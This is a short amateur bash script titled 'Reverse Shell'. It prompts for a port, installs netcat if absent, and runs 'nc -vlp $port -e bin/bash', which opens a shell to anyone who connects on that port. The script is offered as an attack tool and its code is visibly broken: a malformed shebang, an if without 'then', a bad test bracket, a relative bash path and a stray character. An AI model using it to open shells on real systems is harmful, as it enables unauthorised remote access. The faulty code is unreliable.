#!bin/bash

#Reverse Shell by: MIN1 LIP3ZIN :(
clear

#echo "###########"
#echo "MIN1 LIP3ZIN"
#echo "##########"

read  -p  "select port: "    port
find /etc/nc

if [ $? == 1]

       apt-get  install  netcat
        clear
        nc  -vld $port -e  "bin/bash"

        clear

clear

else
 nc  -vlp  $port  -e  "bin/bash"$

clear

      clear

fi
